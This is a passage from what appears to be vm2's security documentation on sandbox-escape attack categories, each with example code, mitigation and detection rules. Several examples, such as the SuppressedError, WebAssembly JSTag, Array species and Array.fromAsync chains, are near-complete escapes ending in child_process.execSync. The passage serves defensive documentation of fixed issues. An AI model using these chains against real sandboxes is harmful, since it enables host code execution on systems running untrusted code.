4. **Handler probing**: Attacker enumerates handler properties/methods looking for anything that returns raw unwrapped host objects.
5. **Constructor chain escape**: With access to a raw host function, the attacker climbs `func.constructor.constructor("return process")()` to escape.

### Canonical Examples

```javascript
// Duck-typing to invoke Buffer.prototype.inspect with controlled options
const obj = {
    subarray: Buffer.prototype.inspect,
    slice: Buffer.prototype.slice,
    hexSlice: () => '',
    l: {__proto__: null}
};

obj.slice(20, {
    showHidden: true,
    showProxy: true,
    depth: 10,
    stylize(a) {
        const handler = this.seen?.[1];
        if (handler) {
            // Attacker probes handler for any property/method
        }
        return a;
    }
});

// Specific attack via handler.get() with forged target (NOW FIXED)
// Uses host-side Array.reduce to call handler.get(rawHostFunction, 'constructor')
// The constructor fallback returns thisReflectGetPrototypeOf(target).constructor
// = Function.prototype.constructor = raw host Function

// Specific attack via fromOtherWithContext method (NOW FIXED)
// handler.fromOtherWithContext({__proto__: null, x: sandboxProxy}).x
// returns raw host function, bypassing proxy protection

// Specific attack via doPreventExtensions method (NOW FIXED)
// handler.doPreventExtensions(target, craftedObject, handler)
// accepted object as a direct parameter, enabling crafted-object injection
```

### Why fromOtherWithContext Was Dangerous (NOW FIXED)

The `fromOtherWithContext` method was specifically designed to convert sandbox objects to host objects. When an attacker passed `{__proto__: null, x: sandboxProxy}`, the method returned a host object where `.x` was the **raw host function**, not a wrapped version. The fix moved this to a closure-scoped function, inaccessible from the handler reference.

### Why handler.get() Direct Call Was Dangerous (NOW FIXED)

The `BaseHandler.prototype.get` method's `constructor` case had a fallback path that used the `target` parameter: `const proto = thisReflectGetPrototypeOf(target); return proto.constructor;`. When called directly (bypassing the proxy mechanism) with a raw host function as `target`, this returned `Function.prototype.constructor` -- the raw host `Function`. The attack used `Array.reduce` with `apply.bind(apply)` as the reducer to chain: `handler.get.call(handler, rawHostFunction, 'constructor')`.

The fix adds `isThisDangerousFunctionConstructor` check on the return value, blocking Function, AsyncFunction, GeneratorFunction, and AsyncGeneratorFunction. The `__proto__` fallback was also hardened to use `otherReflectGetPrototypeOf(object)` instead of `target`.

### Why Handler Class Reconstruction Was Dangerous (NOW FIXED, GHSA-v37h-5mfm-c47c)

After the closure-scoped WeakMap migration (`a6cd917`), handler instances no longer expose `.object`/`.factory` as instance properties, so reading properties off a leaked handler yields nothing useful. But the handler *class itself* was still reachable: `handler → Object.getPrototypeOf(handler) → BaseHandler.prototype → .constructor → BaseHandler`. Calling `new BaseHandler(attackerObject)` constructed a legitimate handler wrapping attacker-controlled state, which the `.set` trap would then use to plant a host-realm proxy of that state into attacker-visible memory -- giving the attacker a cross-realm read/write channel. `Reflect.construct`, custom `newTarget`, `class extends`, `Object.setPrototypeOf({}, BaseHandler.prototype)`, and `pp.set.call(forgedThis, ...)` all achieved variants of the same primitive.

### Mitigation

Wrapped objects stored in closure-scoped WeakMap (`handlerToObject`), accessed only via closure-scoped `getHandlerObject()` function. Conversion methods moved to closure-scoped functions. Proxy target is a fresh shell object. Handler `get` trap checks `isThisDangerousFunctionConstructor` on return values. Three additional layers added for GHSA-v37h-5mfm-c47c:

1. **Construction token**: `createBridge()` captures an unforgeable module-local `Symbol('vm2 bridge handler construction')` in closure. Every `BaseHandler`/`ProtectedHandler`/`ReadOnlyHandler`/`ReadOnlyMockHandler` constructor requires this token as its first argument and throws `VMError(OPNA)` otherwise. All legitimate construction sites (`defaultFactory`, `protectedFactory`, `readonlyFactory`, and the closure-scoped `createReadOnlyMockHandler` / `constructSubclassHandler` helpers used by `setup-sandbox.js`) inject the token from closure. Subclass construction via `class X extends pp.constructor { constructor(o){super(o);} }` fails because `super(o)` sees `token = o` rather than the real sentinel. `Reflect.construct(Handler, [s])` and `Reflect.construct(Handler, [s], altNewTarget)` fail identically.
2. **`getHandlerObject` WeakMap guard**: the closure-scoped `getHandlerObject(handler)` now explicitly checks `handlerToObject.has(handler)` and throws `VMError(OPNA)` if not — so trap methods invoked on a sandbox-forged receiver (`Object.setPrototypeOf({}, pp)`, `pp.set.call(forged, ...)`) refuse to operate rather than returning `undefined` deeper into the trap body.
3. **Constructor-property sentinel rebind**: the `.constructor` property on every handler prototype (`BaseHandler.prototype`, `ProtectedHandler.prototype`, `ReadOnlyHandler.prototype`, `ReadOnlyMockHandler.prototype`) is replaced with a `blockedHandlerConstructor` function that unconditionally throws `VMError(OPNA)`. Prototype-chain walks from any leaked handler never reach a callable form of the real class.

These defenses are independent: even if one fails (e.g., future WeakMap tampering compromises the `has` check), the other two still block the escape.

### Detection Rules

- **`Buffer.prototype.inspect`** assigned to object properties -- duck-typing setup.
- **`Buffer.prototype.slice`** called on non-Buffer objects.
- **`showProxy: true`** in inspect options.
- **`this.seen`** access in `stylize` or other inspect callbacks.
- **Duck-typed objects with `subarray`, `slice`, `hexSlice`** -- mimicking Buffer interface.
- **`handler.get(forgedTarget, 'constructor')`** -- direct call to get trap with attacker-controlled target (now blocked).
- **`b.reduce(apply.bind(apply), handler.get)`** -- using host-side `Array.reduce` to chain handler calls.
- **Calling handler methods directly** (`handler.get()`, `handler.apply()`, etc.).
- **`new pp.constructor(...)` / `Reflect.construct(pp.constructor, ...)`** -- attempting to reconstruct a handler from a leaked instance (now blocked via construction token).
- **`class X extends pp.constructor`** -- subclassing a reachable handler class (now blocked via token propagation).
- **`pp.set.call(forgedThis, ...)` / `pp.get.call(forgedThis, ...)`** -- method invocation on a forged receiver (now blocked via `getHandlerObject` WeakMap guard).

---

## Attack Category 10: Built-in Function Exploitation

### Description

Attackers use built-in functions (`Buffer`, `Reflect`, `Array` methods) as conduits to leak host references or intercept bridge operations.

### Attack Flow

1. Override a built-in constructor or method (`Array`, `Object.create`, `Reflect.construct`).
2. Trigger a bridge operation that internally uses the overridden built-in (e.g., call `Buffer.from()`).
3. The overridden built-in executes attacker code with access to bridge-internal references.

### Canonical Examples

```javascript
// Buffer.apply chain
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
p.call(a).constructor("return process")();

// Override Object.create to inject descriptors
const oc = Object.create;
Object.create = (p, x) => Object.defineProperty(oc(p, x), "get", {
  set() {},
  get: () => (t, k, r) => t.constructor("return process")()
});
Buffer.from.process;

// Override Array constructor
Array = function() {
  Array = arrayBackup;
  throw x => x.constructor("return process")();
};
Buffer.from(valueOfTrigger);

// Override Array.prototype.map
Array.prototype.map = function(callback) {
  leaked = callback(hostRef);
};
```

### Why It Works

Built-in functions like `Buffer.from()` internally create arrays, objects, and call constructors. If the sandbox overrides `Array`, `Object.create`, or `Reflect.construct` before calling a bridge-exposed built-in, the bridge's internal operations use the overridden versions.

### Mitigation

The bridge caches references at init time (`Reflect.apply`, `Reflect.construct`, etc.) and uses cached references for all internal operations. Sandbox-side overrides of `Array`, `Object.create`, etc. do not affect bridge internals.

### Detection Rules

- **`Buffer.apply`**, **`Buffer.from`** with unusual arguments (Proxies, objects with `valueOf`).
- **Override of `Object.create`** -- intercepting object creation.
- **Override of `Reflect.construct`** or other `Reflect` methods.
- **Override of `Array`** constructor or `Array.prototype` methods.
- **Override of `Object.assign`** -- intercepting property copying.
- **`valueOf()` or `toString()` overrides** on objects passed to built-ins.

---

## Attack Category 11: Monkey-Patching Bridge Internals

### Description

Attackers override fundamental methods (`call`, `apply`, `bind`, `defineProperty`) to intercept the bridge's internal operations, which rely on these methods to safely copy values.

### Attack Flow

1. Override `Function.prototype.call`, `.apply`, `.bind`, or `Object.defineProperty` in the sandbox.
2. Trigger a bridge operation (e.g., passing a value across the boundary).
3. The bridge's internal operations use the overridden methods, executing attacker code.

### Canonical Examples

```javascript
// Override all critical methods at once
Object.defineProperties(Object.prototype, {
  '__proto__': { value: null },
  'get': { value: desc },
  'set': { value: desc },
  'apply': { value: desc },
  'call': { value: desc }
});

// Targeted method override
Function.prototype.call = function(...args) {
  return captureHostReferences(this, args);
};
```

### Why It Works

The bridge uses `Function.prototype.call`, `.apply`, and `Reflect.apply` internally. If these are overridden before a bridge operation is triggered, the attacker's code runs with access to internal bridge references. This is why the bridge caches references to `Reflect.apply` and other critical functions at initialization time.

### Mitigation

The bridge caches all critical methods (`Reflect.apply`, `Reflect.construct`, `Reflect.defineProperty`, etc.) at initialization. It uses `Reflect.apply(cachedMethod, ...)` instead of `obj.method()` for all internal operations. Proxy handlers use null-prototype objects to prevent `Object.prototype` pollution from affecting trap resolution.

### Detection Rules

- **Any assignment to `Function.prototype.call`**, `.apply`, or `.bind`.
- **`Object.defineProperties` on `Object.prototype` or `Function.prototype`**.
- **Assigning `null` to `__proto__`** on fundamental prototypes.
- **Override of `Reflect.apply`**, `Reflect.construct`, `Reflect.defineProperty`, etc.
- **Override of `Object.defineProperty`** itself.

---

## Attack Category 12: Code Transformation Bypass

### Description

vm2's transformer rewrites `catch` blocks and `with` statements to prevent access to host objects through exception variables. Attackers attempt to use reserved internal variable names or bypass the transformation entirely.

### Attack Flow

1. Guess the transformer's internal variable name pattern and use it directly.
2. Or use `eval()` / `new Function()` with dynamically constructed strings to generate code that the transformer never sees.
3. Or use syntax that Acorn's configured `ecmaVersion` does not parse (e.g., `using` declarations in ES2024).

### Canonical Examples

```javascript
// Using vm2's internal state variable
aVM2_INTERNAL_TMPNAME = {};
aVM2_INTERNAL_TMPNAME.constructor.constructor("return process")();

// Attempting to access transformer's catch variable
try { throw new Error(); }
catch (a$tmpname) {
  a$tmpname.constructor.constructor("return process")();
}
```

### Why It Works

The transformer renames catch clause variables to internal names and wraps them with sanitization. If an attacker can guess or use the internal variable name directly, they bypass the wrapping logic. Additionally, `eval()` and `new Function()` execute dynamically generated code that the transformer never processes. The transformer uses `ecmaVersion: 2022`, so `using` declarations (ES2024) are invisible -- the transformer does not instrument their implicit catch semantics.

### Mitigation

The transformer validates against internal variable name patterns. `eval` and `new Function` are sandbox-scoped (they cannot access host context directly). However, the `ecmaVersion` limitation remains a known surface -- `using` declarations inside `eval()` bypass catch-block instrumentation entirely.

### Detection Rules

- **Variables containing `VM2_INTERNAL`**, `$tmpname`, or similar patterns.
- **`with` statements** -- security-sensitive and instrumented.
- **Direct `eval()`** usage -- bypasses transformer.
- **`new Function()`** with dynamically constructed strings.
- **`using` or `await using`** inside `eval()` -- bypasses transformer's `ecmaVersion: 2022`.

---

## Attack Category 13: Dynamic Import and Module Loading

### Description

`import()` expressions create Promises whose constructor chain may not be properly sandboxed. Module loading can also expose host filesystem or module resolution internals.

### Attack Flow

1. Use `import("anything")` which returns a host-realm Promise.
2. Access `.constructor.constructor` on the promise to get host `Function`.

### Canonical Examples

```javascript
// Dynamic import constructor chain
const p = import("anything");
p.constructor.constructor("return process")();

// require from NodeVM context with path traversal
require("../../host-module");
```

### Why It Works

Dynamic `import()` returns a Promise created by the host runtime, not the sandbox. Its `.constructor` is the host `Promise`, whose `.constructor` is the host `Function`.

### Mitigation

Dynamic `import()` throws `VMError` unconditionally. `require()` in `NodeVM` enforces path restrictions.

### Detection Rules

- **`import()`** expressions -- dynamic imports.
- **`require()`** with path traversal (`../`) targeting files outside allowed paths.
- **Access to `module`, `exports`, `__filename`, `__dirname`** in VM (non-NodeVM) context.

---

## Attack Category 14: Object.prototype Trap Pollution via `in` Operator

### Description

The `in` operator triggers the `has` trap on Proxy objects. By polluting `Object.prototype.has`, attackers can intercept `in` operations on all proxy-wrapped objects.

### Attack Flow

1. Set `Object.prototype.has = function(target, key) { ... }`.
2. Use the `in` operator on a bridge-proxied object: `"property" in Buffer.from`.
3. Since the proxy handler inherits from `Object.prototype`, the polluted `has` becomes the trap.
4. The trap receives `target` (the raw unwrapped target) as its first argument.

### Canonical Examples

```javascript
Object.prototype.has = (target, key) => {
  process = target.constructor("return process")();
};
"property" in Buffer.from;
process.mainModule.require("child_process");
```

### Why It Works

Proxy handlers inherit from `Object.prototype`. If `has` is defined on `Object.prototype`, it acts as the `has` trap for any Proxy whose handler does not explicitly define one. The `target` argument to the trap is the raw (unwrapped) target.

### Mitigation

Proxy handlers use null-prototype objects (`{__proto__: null}`), preventing `Object.prototype` pollution from affecting trap resolution.

### Detection Rules

- **`Object.prototype.has = ...`** -- prototype pollution targeting proxy traps.
- **`Object.prototype.get = ...`**, **`Object.prototype.set = ...`** -- same pattern for other traps.
- **`"x" in proxiedObject`** -- triggering has trap on bridge-wrapped objects.
- **Any property name matching Proxy trap names** (`has`, `get`, `set`, `apply`, `construct`, `getPrototypeOf`, etc.) defined on `Object.prototype`.

---

## Attack Category 15: Property Descriptor Value Extraction

### Description

Property descriptors returned by `Object.getOwnPropertyDescriptor` contain a `value` property holding the actual property value. When the property is `Function.prototype.constructor`, this value is the host's `Function` constructor. Attackers can build arbitrarily deep nesting by chaining `getOwnPropertyDescriptors` calls, then extract values using `Object.entries()` which bypasses direct property access protections.

### Attack Flow

1. Get `Object.getOwnPropertyDescriptor(Function.prototype, 'constructor')` -- descriptor contains `value: Function`.
2. The descriptor is wrapped as a proxy, but the underlying host object contains the raw Function constructor.
3. Pass the proxy to a host function like `Object.entries()` -- it gets unwrapped via `mappingThisToOther`.
4. The host's `Object.entries` sees unsanitized content, including the raw Function constructor.
5. Extract the Function constructor via chained `Object.entries` calls.

### Canonical Examples

```javascript
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const fp = p.call(a);  // Function.prototype
const op = p.call(fp); // Object.prototype
const ho = op.constructor; // Object

const cd = ho.getOwnPropertyDescriptor(fp, 'constructor');
// cd = {value: Function, writable: true, enumerable: false, configurable: true}

const e = ho.entries(cd).find(v => v[0] === 'value');
e.shift(); // e = [Function]
e.push([undefined, ['return process']]);
a.apply(a, e)().mainModule.require('child_process').execSync('...');
```

### Why It Works

When sandbox proxies are passed to host functions, they are unwrapped via `mappingThisToOther` back to the original host object. The host function then sees unsanitized content.

### Mitigation

Objects containing dangerous constructors are proxied with `preventUnwrap` -- they are NOT registered in `mappingThisToOther`. When passed to host functions, they cannot be unwrapped; instead the bridge creates a double-proxy where all property access goes through sanitizing traps. The proxy's `get` trap returns `{}` for dangerous constructor values. `containsDangerousConstructor` performs a shallow scan of own property descriptors at each bridge crossing; nested host objects are scanned independently when they themselves cross the bridge, so layered descriptor-extraction attacks (`getOwnPropertyDescriptor` on `getOwnPropertyDescriptors` results, etc.) are caught at the layer where the Function constructor is exposed at depth 1.

### Detection Rules

- **`Object.getOwnPropertyDescriptor(hostPrototype, 'constructor')`** -- getting descriptor for constructor property.
- **`Object.getOwnPropertyDescriptors(hostPrototype)`** -- getting all descriptors.
- **Chained `getOwnPropertyDescriptors` calls** -- building deep nesting.
- **`Object.entries(descriptor)`** or **`Object.values(descriptor)`** -- extracting values from descriptors.
- **`entries.apply(null, arr)`** -- passing extracted arrays back to host functions.
- **`apply.apply(apply, array)`** -- calling extracted Function with arguments.

---

# Tier 3 -- Compound Attacks

These are real-world exploits that combine multiple techniques from Tiers 1 and 2 into complete escape chains. Each was discovered as a working exploit and subsequently fixed.

---

## Attack Category 16: SuppressedError via Explicit Resource Management

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 12: Code Transformation Bypass](#attack-category-12-code-transformation-bypass)

### Description

The Explicit Resource Management proposal (ES2024) introduces `DisposableStack`, `AsyncDisposableStack`, and the `using` declaration. When multiple errors occur during resource disposal, V8 wraps them in a `SuppressedError` with `.error` and `.suppressed` properties. These properties can contain host-realm errors that bypass bridge sanitization.

### Attack Flow

1. Create a disposable resource whose `Symbol.dispose` method triggers the Error Generation Primitive (`e.name = Symbol(); e.stack`), producing a host TypeError.
2. Use a `using` declaration or `DisposableStack.defer()` so that disposal happens automatically.
3. Arrange for a second error (e.g., `throw null`) so V8 wraps both in a `SuppressedError`.
4. Catch the `SuppressedError` -- its `.error` or `.suppressed` contains the unsanitized host TypeError.
5. Traverse `.error.constructor.constructor` to reach host `Function`.

### Canonical Examples

```javascript
// DisposableStack attack
const ds = new DisposableStack();
ds.defer(() => { throw null; });
ds.defer(() => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  ds.dispose();
} catch(e) {
  // e.suppressed is the host TypeError (unsanitized)
  const Function = e.suppressed.constructor.constructor;
  const process = new Function("return process;")();
  process.mainModule.require("child_process").execSync("...");
}

// 'using' declaration attack (bypasses transformer -- ecmaVersion 2022)
obj = {[Symbol.dispose]() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;
}};
try {
    eval("{using a = obj;throw null;}");
} catch(e) {
    e.error.constructor.constructor("return process")()
      .mainModule.require('child_process').execSync('...');
}

// AsyncDisposableStack attack
const ds = new AsyncDisposableStack();
ds.defer(async () => { throw null; });
ds.defer(async () => {
  const e = Error();
  e.name = Symbol();
  e.stack;
});
try {
  await ds.disposeAsync();
} catch(e) {
  const Function = e.suppressed.constructor.constructor;
  Function("return process")().mainModule.require("child_process").execSync("...");
}
```

### Why It Works

V8 creates `SuppressedError` instances using the sandbox context's intrinsic constructor during resource disposal. The resulting object is a sandbox object, so `ensureThis` returns it as-is. However, the `.error` and `.suppressed` properties are set by V8's internal code and may contain **host-realm** errors. Since these properties are accessed as regular property reads on a sandbox object (not through a bridge proxy), the host errors are returned without sanitization.

The `using` declaration bypasses the transformer because Acorn's `ecmaVersion: 2022` does not parse ES2024 syntax -- the implicit catch semantics of `using` are invisible to instrumentation.

Note: `Error.cause` is a related concern -- it can carry host references -- but since `Error.cause` is set by user code (not V8 internals), `ensureThis` handles it through normal property access on proxied errors.

### Mitigation

`handleException` (catch-block sanitizer) detects `SuppressedError` instances by prototype check and recursively sanitizes `.error` and `.suppressed` properties via `ensureThis`. `SuppressedError` is also added to `errorsList` in `bridge.js`. Depth limit of 16 prevents infinite recursion from circular chains.

### Detection Rules

- **`new DisposableStack()`** or **`new AsyncDisposableStack()`** with `defer()`.
- **`using` declarations** in `eval()` -- triggers `Symbol.dispose` on scope exit.
- **`await using` declarations** -- triggers `Symbol.asyncDispose`.
- **`e.suppressed.constructor`** or **`e.error.constructor`** in catch blocks.
- **`SuppressedError`** combined with `e.name = Symbol()`.

---

## Attack Category 17: WebAssembly JSTag Exception Catch

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 12: Code Transformation Bypass](#attack-category-12-code-transformation-bypass)

### Description

`WebAssembly.JSTag` (available since ~Node 23) is a special tag that allows WebAssembly exception handling (`try_table`/`catch`) to catch JavaScript exceptions thrown during imported function calls. Since the transformer only instruments JavaScript `catch` clauses, exceptions caught in WebAssembly completely bypass `handleException()` sanitization.

### Attack Flow

1. **Error setup**: `err.name = Symbol()` causes `err.stack` to throw a host TypeError (Error Generation Primitive).
2. **Wasm module creation**: A WebAssembly module imports a `trigger` function that accesses `err.stack` and `WebAssembly.JSTag` as a tag for catching JS exceptions.
3. **Wasm exception catch**: The module's exported function uses `try_table/catch` with JSTag. When `trigger()` throws the host TypeError, wasm catches it and returns the exception value as an `externref`.
4. **Bypass**: The transformer only instruments JavaScript `catch` blocks. Wasm exception handling is a separate mechanism -- the transformer has zero visibility into wasm bytecode. The caught host error is returned raw and unsanitized.
5. **Escape**: `hostError.constructor.constructor("return process")()` -> RCE.

### Canonical Examples

```javascript
const err = new Error("x");
err.name = Symbol();

const wasm = new Uint8Array([
    0x00,0x61,0x73,0x6d,0x01,0x00,0x00,0x00,
    0x01,0x0c,0x03,0x60,0x00,0x00,0x60,0x00,0x01,0x6f,0x60,0x01,0x6f,0x00,
    0x02,0x19,0x02,
    0x03,0x65,0x6e,0x76,0x07,0x74,0x72,0x69,0x67,0x67,0x65,0x72,0x00,0x00,
    0x02,0x6a,0x73,0x03,0x74,0x61,0x67,0x04,0x00,0x02,
    0x03,0x02,0x01,0x01,
    0x07,0x0f,0x01,
    0x0b,0x63,0x61,0x74,0x63,0x68,0x5f,0x65,0x72,0x72,0x6f,0x72,0x00,0x01,
    0x0a,0x12,0x01,0x10,0x00,
    0x02,0x6f,0x1f,0x40,0x01,0x00,0x00,0x00,0x10,0x00,0x00,0x0b,0x00,0x0b,0x0b
]);

const instance = new WebAssembly.Instance(
    new WebAssembly.Module(wasm),
    { env: { trigger() { err.stack; } }, js: { tag: WebAssembly.JSTag } }
);

const hostError = instance.exports.catch_error();
const p = hostError.constructor.constructor("return process")();
p.mainModule.require('child_process').execSync('...');
```

### Why It Works

The entire exception sanitization strategy is built on instrumenting JavaScript `catch` clauses via the transformer. WebAssembly introduces a parallel exception-catching mechanism that operates at the bytecode level, completely outside the transformer's scope. Without `JSTag`, wasm can only catch custom wasm exceptions (not JS exceptions), and `catch_all` does not expose the exception value.

### Mitigation

`WebAssembly.JSTag` is deleted from the sandbox at initialization in `setup-sandbox.js`. Without JSTag, wasm code cannot catch JavaScript exceptions -- `catch_all` provides no value access, and `catch_all_ref` requires JSTag for `exn.extract`. The tag is a V8 internal and cannot be reconstructed by user code.

### Detection Rules

- **`WebAssembly.JSTag`** -- accessing the JS exception tag.
- **`WebAssembly.Instance`** with import objects containing `tag:` properties.
- **Wasm modules with `try_table`/`catch` instructions**.
- **Combination of wasm exception handling + Error Generation Primitive**.
- **`instance.exports.*` returning externref values**.

---

## Attack Category 18: Array Species Self-Return via Constructor Manipulation

**Uses**: [Category 3: Symbol-Based Attacks](#attack-category-3-symbol-based-attacks), [Category 10: Built-in Function Exploitation](#attack-category-10-built-in-function-exploitation)

### Description

V8's `ArraySpeciesCreate` algorithm reads `this.constructor[Symbol.species]` when methods like `Array.prototype.map`, `.filter`, `.slice`, `.splice`, `.concat`, `.flat`, `.flatMap` create a result array. By setting `constructor` on a host array to a function that (1) returns the same array and (2) has `Symbol.species` pointing to itself, an attacker makes `map` store raw host-side function results directly into the original array -- bypassing bridge sanitization entirely.

### Attack Flow

1. **Host array creation**: `ho.entries({})` creates a host array which gets proxied to the sandbox.
2. **Species constructor setup**: A sandbox function `x()` is created that returns the same array `r`. `x[Symbol.species] = x` makes V8's species resolution return `x` itself.
3. **Constructor injection**: The attacker sets `r.constructor = x`. Multiple methods:
   - **Direct write**: `r.constructor = x` (blocked by proxy `set` trap storing locally)
   - **Object.assign bypass**: `ho.assign(r, {constructor: x})` (sets directly on host array)
   - **Non-configurable constructor**: `Object.defineProperty` with `configurable: false` (detected by `Reflect.deleteProperty` check)
   - **Prototype-level**: `Object.setPrototypeOf` (blocked by own property `constructor=undefined` shadowing)
4. **Species-driven map**: `r.map(f)` triggers `ArraySpeciesCreate`. V8 reads `r.constructor` -> gets `x`, reads `x[Symbol.species]` -> gets `x`, calls `new x(length)` -> returns `r`. `map` stores callback results directly into `r` on the host side.
5. **Chained extraction**: Multiple `cwu` calls build up to extracting the host `Function` constructor -> RCE.

### Canonical Examples

```javascript
// The 'call-with-unwrap' (cwu) primitive
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const op = p.call(p.call(p.call(p.call(Buffer.of()))));
const ho = op.constructor;  // host Object

function cwu(func, thiz, args) {
    const r = ho.entries({});  // host array
    args.unshift(thiz);
    const f = a.apply(a.bind, [func, args]);
    r[0] = 0;
    function x() { return r; }  // species constructor returns same array
    x[Symbol.species] = x;      // species points to itself
    r.constructor = x;           // direct write (blocked by set trap)
    // OR: ho.assign(r, {constructor: x});  // Object.assign bypass
    r.map(f);  // ArraySpeciesCreate uses x -> returns r -> stores raw results
    r.constructor = undefined;
    return r;  // r[0] now contains raw unsanitized host value
}

// Chain cwu calls to extract host Function constructor
const d = cwu(a, g, [ho.freeze, ['__proto__']]);
const e = cwu(a, d[0], [ho.entries({}), ['call']]);
const c = cwu(a, a, [e[0]]);
a.apply(a, e)().mainModule.require('child_process').execSync('...');
```

### Why It Works

The bridge wraps every value crossing the boundary in proxies, but `ArraySpeciesCreate` is a V8 internal algorithm that operates entirely within the host realm. When the species constructor returns the same array, `map`'s internal `CreateDataPropertyOrThrow` stores results directly on that array -- no bridge crossing occurs. The values stay on the host side, completely bypassing proxy sanitization.

The `Object.assign` bypass is particularly insidious: the sandbox proxy's `set` trap only intercepts writes initiated from the sandbox side. `Object.assign` runs as a host-side function (through the `apply` trap), and its internal `[[Set]]` operations target the underlying host array directly.

### Mitigation

Two-layer defense in `lib/bridge.js`:

1. **Proxy `get` trap — cached `Array` ctor for host arrays**: When sandbox code reads `.constructor` on a host-array-backed proxy, the trap returns a module-load-time-captured `thisArrayCtor = Array` reference. This bypass of the normal property read neutralises any attacker-installed `constructor` (direct `r.constructor = x`, `Object.defineProperty`, `Object.assign`, prototype-chain injection via `Object.setPrototypeOf`) and is immune to prototype pollution of `Array.prototype.constructor`. Only defends sandbox-side reads; does not cover V8-internal reads issued from the host realm.
2. **Apply/construct trap neutralize-and-restore**: Before every `otherReflectApply(object, context, args)` and `otherReflectConstruct(object, args)` — i.e. every sandbox→host function invocation — the bridge walks `context` and each top-level argument. For every host array found (`Array.isArray` is cross-realm safe), it installs `constructor = undefined` as a data own property (shadowing both own and inherited constructors; the ES2024 spec explicitly maps `constructor === undefined` to `%Array%` in ArraySpeciesCreate). After the host call returns — in a `finally` — the prior descriptor is restored (or the shadow deleted if none existed). This covers V8-internal reads issued from the host realm during the call.

Both layers reject un-neutralisable arrays with `VMError`: a pre-installed non-configurable `constructor` whose value is anything other than `undefined`, or a non-extensible array without an own `constructor` slot, cannot be safely shadowed or restored and is treated as an attack.

The neutralize-on-entry/restore-on-exit pattern mirrors `resetPromiseSpecies` in `setup-sandbox.js`, which closes the equivalent V8-internal-bypass class for Promise.

### Detection Rules

- **`r.constructor = x` where `x` has `Symbol.species`** -- species self-return pattern.
- **`x[Symbol.species] = x`** -- self-referential species.
- **`function x() { return r; }` as species** -- constructor returning existing object.
- **`ho.assign(r, {constructor: ...})`** -- bypassing proxy set trap via host Object.assign.
- **`.map(f)` on arrays with custom constructor** -- triggering ArraySpeciesCreate.
- **`ho.entries({})` or `Object.entries()`** -- creating host arrays for species manipulation.

---

## Attack Category 19: Host prepareStackTrace Fallback via Array.fromAsync Promise Bypass

**Uses**: [Category 4: Error Object Exploitation](#attack-category-4-error-object-exploitation), [Category 7: Promise and Async Exploitation](#attack-category-7-promise-and-async-exploitation), [Category 16: SuppressedError via Explicit Resource Management](#attack-category-16-suppressederror-via-explicit-resource-management)

### Description

When `Error.prepareStackTrace` is `undefined` in the sandbox, V8 falls back to Node.js's host-side `prepareStackTraceCallback` (from `node:internal/errors`). If that host code throws (e.g., when `error.name` is a `Symbol`), the `TypeError` is a **host-realm** error. By combining this with `Array.fromAsync` to obtain a host promise (whose `.catch` bypasses sandbox `handleException` wrapping), and `using` declarations to create `SuppressedError`, the attacker leaks a host `TypeError` and climbs to the host `Function` constructor.

### Attack Flow

1. **Prototype walking**: `__lookupGetter__` + `Buffer.apply` chain to obtain host `Object` and host `Array` constructors.
2. **Host promise acquisition**: `ha.fromAsync(...)` (host `Array.fromAsync`) returns a host promise. Unlike sandbox promises whose `.catch()` is wrapped with `handleException`, the host promise's `.catch()` passes values directly.
3. **Host TypeError generation**: Inside the callback, a `using` declaration creates a disposable object whose `Symbol.dispose` method accesses `Error.stack` with `error.name = Symbol()`. When `Error.prepareStackTrace` is `undefined`, V8 delegates to Node.js's host-side `prepareStackTraceCallback`, which throws a **host-realm** `TypeError`.
4. **SuppressedError wrapping**: The `using` scope exit encounters two errors: the host `TypeError` and `null`. V8 wraps them in a `SuppressedError`.
5. **Host promise catch bypass**: The `SuppressedError` propagates through the host promise's `.catch()`. Since this is a host promise, `handleException` is never called.
6. **Escape**: `e.error.constructor.constructor` gives host `Function` -> RCE.

### Canonical Examples

```javascript
const g = ({}).__lookupGetter__;
const a = Buffer.apply;
const p = a.apply(g, [Buffer, ['__proto__']]);
const op = p.call(p.call(p.call(p.call(Buffer.of()))));
const ho = op.constructor;        // host Object
const ap = p.call(ho.entries({}));
const ha = ap.constructor;         // host Array

ha.fromAsync([0], ()=>{
  obj = {[Symbol.dispose]() {
    const e = new Error();
    e.name = Symbol();
    return e.stack;     // Triggers host prepareStackTraceCallback
  }};
  eval("{using a = obj;throw null;}");
}).catch(e=> {
  // e is SuppressedError; e.error is HOST TypeError
  const F = e.error.constructor.constructor;
  const proc = F('return process')();
  proc.mainModule.require('child_process').execSync('id');
});
```

### Why It Works

The key insight is that `Error.prepareStackTrace` being `undefined` in the sandbox causes V8 to delegate stack formatting to Node.js's host-side code. This host code runs in the host context, so any `TypeError` it throws is a host-realm error.

The second critical component is the host promise from `Array.fromAsync`. The sandbox wraps `Promise.prototype.catch` to run `handleException` on caught values, but this wrapping only applies to sandbox promises. Host promises obtained through host array methods bypass this wrapping entirely.

### Mitigation

Sandbox always provides a `defaultSandboxPrepareStackTrace` function so V8 never falls back to host's `prepareStackTraceCallback`. The default function safely handles Symbol names, Proxy objects, and other exotic types without throwing. When user clears `Error.prepareStackTrace`, it resets to the safe default instead of `undefined`.

### Detection Rules

- **`Array.fromAsync`** called on a host `Array` constructor -- returns host promises.
- **Host promise `.catch()`** or `.then()` -- callbacks receive unsanitized values.
- **`Error.prepareStackTrace = undefined`** or **`delete Error.prepareStackTrace`** -- triggers host fallback.
- **`error.name = Symbol()` + `error.stack`** -- Error Generation Primitive targeting host formatter.
- **`using` declaration inside `eval()`** -- SuppressedError + transformer bypass.
- **Prototype chain walking** (`__lookupGetter__`, `Buffer.apply`) to obtain host `Array` constructor.

---

## Considered Attack Surfaces

These attack surfaces were analyzed and found to be safe or low-risk. They are documented here so future reviewers do not re-investigate them.

- **WeakRef / FinalizationRegistry**: Held values are specified at registration time. `thisFromOther` always re-wraps values when they cross the boundary, so the weak reference cannot leak a raw host object.

- **structuredClone**: Not available in default `vm` context globals. Even if available, `structuredClone` strips prototype chains and creates plain objects, which cannot carry host constructors.

